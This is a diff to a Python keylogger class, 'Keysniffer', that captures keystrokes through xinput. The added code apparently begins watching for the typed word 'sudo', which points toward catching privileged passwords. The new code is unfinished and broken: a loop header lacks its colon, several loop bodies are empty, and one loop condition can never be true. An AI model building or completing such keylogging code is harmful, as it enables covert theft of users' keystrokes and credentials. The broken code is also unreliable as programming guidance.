@@ -37,15 +37,44 @@ class Keysniffer():
                                         self.keycodes[str(c1)] = names
 
 
-        def CodeConverter(self, code):
-                print(self.keycodes[str(code)])
+        def CodeConverter(self, codes):
+                in_buffer = list(codes)
+                out_buffer = []
+                for item in in_buffer:
+                        out_buffer.append(self.keycodes[str(item)])
+                
+
+                
 
         def Sniff(self):
                 keystream = subprocess.Popen((self.xinput), stdout=subprocess.PIPE, 
                         universal_newlines=True)
 
-                for line in keystream.stdout:
-                        code = str(line).strip().split()
-                        self.CodeConverter(code[1])
+                code_buf = []
+                while len(code_buf) > 5:
+                        for line in keystream.stdout:
+                                if "release" in line:
+                                        code = str(line).strip().split()
+                                        code_buf.append(code[2])
+                                else:
+                                        continue
+                
+                sudo = str('sudo').split
+                search_str = []
+                for char in sudo:
+                        search_str.append('(' + char + ')')
+                search_codes = []
+
+                for item in self.keycodes.keys()
+                        reverse_keys = {}
+                        
+
+                for item in search_str:
+                        
+                        
+
+                
+                for code in code_buf:
+
 
         
